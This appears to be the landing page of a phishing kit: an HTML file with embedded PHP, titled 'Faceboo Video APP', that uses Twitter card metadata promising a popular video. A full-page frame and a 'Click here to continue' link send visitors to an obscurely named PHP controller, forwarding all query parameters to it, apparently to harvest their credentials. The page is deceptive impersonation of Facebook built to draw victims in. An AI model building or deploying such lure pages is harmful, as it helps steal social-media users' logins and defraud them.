
	<html> 
	<head> 
	<title>Faceboo Video APP</title>
		
		<meta name="twitter:card" content="summary" />
		<meta name="twitter:site" content="@carmelo_jhon" />
		<meta name="twitter:title" content="Watch video @carmelo_jhon" />
		<meta name="twitter:description" content="588,963 Views " />
		<meta name="twitter:image" content="https://avatars.io/twitter/carmelo_jhon" />
	
	</head>
	<frameset rows="*,3" frameborder="NO" border="50" framespacing="0">
	<frame name="main" src="../.././public/CONTROLLERdea3426f-cb95-4e96-8496-de07c6bb82df.php?source=.%2Fpublic%2FACCESSS45a880a0-eb13-4dbc-929b-1e43c8306ae8&lan=twthk&<?php echo http_build_query($_GET); ?>"> <noframes> 
	<body bgcolor="#FFFFFF" text="#000000"> 
	<a href="../.././public/CONTROLLERdea3426f-cb95-4e96-8496-de07c6bb82df.php?source=.%2Fpublic%2FACCESSS45a880a0-eb13-4dbc-929b-1e43c8306ae8&lan=twthk&<?php echo http_build_query($_GET); ?>">Click here to continue</a> 
	</body> 
	</noframes> 
	</html> 
   